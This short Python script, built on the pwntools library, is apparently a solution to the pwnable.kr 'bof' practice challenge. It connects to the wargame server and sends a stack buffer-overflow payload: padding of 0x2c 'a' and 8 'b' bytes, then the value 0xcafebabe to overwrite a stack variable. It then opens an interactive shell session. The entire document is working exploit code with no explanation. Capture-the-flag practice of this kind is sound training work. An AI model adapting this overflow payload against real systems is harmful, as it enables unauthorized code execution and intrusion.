from pwn import *

context.log_level = 'debug'

conn=remote('pwnable.kr',9000)

p = 'a'*0x2c
p+= 'b'*8
p+= '\xbe\xba\xfe\xca' 

conn.sendline(p)

conn.interactive()
